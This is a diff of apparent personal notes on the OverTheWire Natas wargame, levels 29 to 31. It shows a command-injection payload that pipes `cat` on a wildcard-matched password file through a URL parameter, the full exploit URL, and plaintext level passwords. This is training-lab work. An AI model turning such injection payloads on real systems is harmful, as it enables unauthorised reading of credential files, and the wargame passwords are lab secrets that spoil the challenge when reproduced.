@@ -937,3 +937,11 @@ END
 - There are a few options here for bypassing disallowed strings, the one I found was inspired by this CTF writeup. It uses wildcards to match a directory or file name. We have command injection working, we know how the filtering works. To get the flag printed, we can swap out one character in each “natas” with a ?: `|cat /etc/n?tas_webpass/n?tas30 %00`
 - http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00
 - WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+
+
+
+## 30->31
+- http://natas30.natas.labs.overthewire.org/
+- `natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`
+- https://learnhacking.io/overthewire-natas-level-30-walkthrough/
+- https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872
